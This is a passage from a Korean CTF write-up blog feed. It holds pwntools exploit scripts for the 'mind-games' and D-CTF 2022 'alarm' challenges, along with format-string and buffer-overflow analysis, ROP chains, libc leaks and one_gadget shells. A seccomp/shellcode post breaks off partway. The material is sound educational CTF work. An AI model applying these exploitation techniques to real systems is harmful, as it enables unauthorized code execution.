class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./mind-games&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.ctf.gdgalgiers.com&#x27;</span>, <span class="number">1404</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mind-games&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line">log.info(<span class="string">b&#x27;random ::&#x27;</span> + random)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = e.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line"></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(<span class="number">0xe6c84</span>+libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><ol><li><p>풀고 나서 익스 코드를 날려버려서 대회 끝나고 다시 풀었다. 대회 때 뭔가 확률적으로 shell을 얻을 수 있었는데, 지금 생각해보니 random 값 때문이었던 것 같다. 첫 main에서 구한 random 값을 두 번째 main에서 사용하려니 시간이 조금 지나 흐름이 이어지지 않는 경우가 생겨서 while, try-except 구문을 이용했었다… ㅋㅋ </p></li><li><p>대회 종료 후 이게 솔브 수가 19였는데 25솔짜리 문제는 풀지 못하였다 ㅜㅜ, 힙 문제였는데.. 요약하자면 oob를 통해 libc leak을 할 수 있고, heap overflow를 이용하여 heap chunk의 size를 조작할 수 있다. 이거를 이용해서 푸는 문제였는데,.. 암튼 못풀었다. 다른 쉬운 힙 문제들 좀 풀어보고 풀어봐야겠다 T_T</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> GDG-Algiers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> random </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - alarm (fsb, one_gadget)</title>
      <link href="/221005-d-ctf2022-alarm/"/>
      <url>/221005-d-ctf2022-alarm/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리</p><p>해당 ctf에 pwn이 두 문제 나왔다. 이건 medium이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>IDA로 열어보면 되게 간단하다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400807(a1, a2, a3);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;buf, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the Alarm system!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(byte_6010C0, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_6010C0);                        <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unlock value of alarm: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      vuln(<span class="string">&quot;%x&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;UGVybWlzc2lvbiBkZW5pZWQhCg==\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb 취약점이 대놓고 보인다. 입력할 수 있는 바이트 수도 굉장히 넉넉하다.</p><p>바로 아래에서도 어떤 입력값 하나를 주고 그 입력값이 <code>/dev/urandom</code> 랜덤값과 같은지 비교한다. 같으면 <code>vuln</code> 함수가 실행되어 bof를 트리거할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400861</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Alarm set to @%p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5000uLL</span>);                        <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb 취약점이 존재한다면 할 수 있는게 굉장히 많다. 예를 들면 스택 값 노출 정도?</p><p>이 문제에선 bof를 트리거하고 작성할 수 있는 바이트 수가 굉장히 넉넉하고, canary도 존재하지 않아 bof만 잘 트리거 된다면 무리없이 ROP를 진행할 수 있을 것이다.</p><p>bof를 트리거하기 위한 조건은 랜덤 값을 일치시켜야하는 것인데, 이 랜덤 값은 스택에 저장된다. 따라서 fsb로 랜덤 값을 알아낼 수 있다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>fsb를 이용하여 랜덤 값과 libc base 구하기</li><li>랜덤 값을 입력하여 bof 트리거</li><li>ROP!</li></ol><h3 id="Exploit-Code-local-Ubuntu-20-04"><a href="#Exploit-Code-local-Ubuntu-20-04" class="headerlink" title="Exploit Code (local, Ubuntu 20.04)"></a>Exploit Code (local, Ubuntu 20.04)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.80.143&#x27;, 31776)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">131</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x23b6a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += &#x27;C&#x27; * 8 # ret</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="find-libc"><a href="#find-libc" class="headerlink" title="find libc"></a>find libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 랜덤 값 전송 후</span></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">pop_rdi = <span class="number">0x400a23</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x400690</span> <span class="comment">#e.plt[&#x27;puts&#x27;]</span></span><br><span class="line">open_got = e.got[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got) <span class="comment"># open_got</span></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts: 970</span><br><span class="line">open: bf0</span><br></pre></td></tr></table></figure><p>libc database site: <a href="https://libcdb.konwur.de/">https://libcdb.konwur.de/</a></p><p>최종적으로 구한 libc version: <code>libc6_2.27-3ubuntu1.6_amd64.so</code></p><h3 id="Exploit-Code-remote-Ubuntu-18-04"><a href="#Exploit-Code-remote-Ubuntu-18-04" class="headerlink" title="Exploit Code (remote, Ubuntu 18.04)"></a>Exploit Code (remote, Ubuntu 18.04)</h3><p>remote libc가 Ubuntu 18.04의 libc 버전이라서 원가젯을 무리없이 사용할 수 있었다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./alarm&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.80.143&#x27;</span>, <span class="number">31776</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%11$p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">231</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">oneshot = libc_base+<span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rdi)</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(oneshot)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>사실 이 대회 기간 때 libc version 구하고 main으로 돌려서(?) 뭐 이것저것 삽질하다가 못풀었다 ㅋㅋ;; main으로 돌리니깐 rip가 맨 처음 보내준 랜덤 값으로 바뀌어서 다른 일을 잠깐 하러 갔다. 그런 사이 대회가 종료되어서 서버가 바로 닫혀버려서 remote shell은 따지 못하였다. 후..</p><p>창도 다 닫아버려서 libc 버전도 까먹었고, 서버도 닫혀서 offset도 구할 수 없어서 디코에 조심스럽게 libc 버전을 물어봤더니 <code>libc6_2.27-3ubuntu1.6_amd64.so</code> 라고 친절하게 알려주셨다. 그래서 바이너리를 patch하고 풀어보았다. </p><p>사실 이 과정에서 새로운 사실을 알게 되었다.</p><p>알려주신 libc 버전은 Ubuntu 18.04과 동일하다. 그래서 Ubuntu 18.04에서 libc와 ld를 가져왔다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007fff621e2000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05fa6c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f05fa8cf000)</span><br><span class="line"></span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ls</span><br><span class="line">alarm  ld-2.27.so  libc-2.27.so  local.py  remote.py</span><br></pre></td></tr></table></figure><p>patch를 하려는데 잘 안되어서 알아보니까 libc 이름을 <code>libc.so.6</code>으로 변경해야하더라.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --set-interpreter ./ld-2.27.so alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ cp libc-2.27.so libc.so.6</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007ffd5c699000)</span><br><span class="line">./libc.so.6 (0x00007f32d2251000)</span><br><span class="line">./ld-2.27.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f32d2644000)</span><br></pre></td></tr></table></figure><p>이렇게 remote의 바이너리로 patch해서 remote를 잘 해결할 수 있었다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - destruction (seccomp, shellcode)</title>
      <link href="/221005-d-ctf2022-destruction/"/>
      <url>/221005-d-ctf2022-destruction/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리</p><p>해당 ctf에 pwn이 두 문제 나왔다. 이건 hard이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>아무것도 안걸려있다. 스택에서 쉘코드도 실행이 가능하다. 하지만 <code>seccomp</code>이 걸려있지.. 쉘코드 실행이 선택적으로 가능하다.</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Acces denied intruder detected!!&quot;</span>);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  seccomp();</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL) &lt;= <span class="number">0</span> )             <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="string">&quot;done&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>취약점은 간단하다. 바로 bof가 발생하는 것을 한 눈에 찾아볼 수 있다.</p><p>그리고 이 바이너리에서 중요한 점은 seccomp 함수가 정의되어 있다는 사실이다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(SECCOMP)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *__errno_location() == <span class="number">22</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SECCOMP_FILTER is not available. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !*__errno_location() )</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br></pre></td></tr></table></figure><p><code>seccomp-tools</code>을 이용하여 편리하게 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 